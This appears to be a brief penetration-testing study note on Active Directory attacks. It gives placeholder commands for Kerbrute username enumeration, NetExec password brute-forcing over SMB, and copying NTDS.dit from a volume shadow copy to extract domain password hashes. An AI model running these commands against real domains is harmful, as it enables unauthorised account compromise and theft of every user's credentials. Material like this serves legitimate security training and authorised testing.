After we prepared a list of possible usernames and password list, we can use different tools to validate users or attempt to bruteforce into account, Refer to [[Generating Possible Usernames]] 

-Using Kerbrute to Enumerate valid usernames
```
./kerbrute_linux_amd64 userenum --dc <dcip> --domain <domain> <username_candidate>
```

-Using NetExec to perform Password Attack:
```
netexec smb <dcip> -u <username> -p <passwordlist>
```

After we are in and if we acquire an account with admin privilege, we can capture NTDS.dit and extract hashes for user accounts

Using WinRM / PS:
```
net user <username> #check if user have respective privilege
vssadmin CREATE SHADOW /FOR=C: #Important: Markdown Shadow Copy Volume Name
cmd.exe /c copy <SCVolumeName>\Windows\NTDS\NTDS.dit <absdestpath>
Example: cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit



```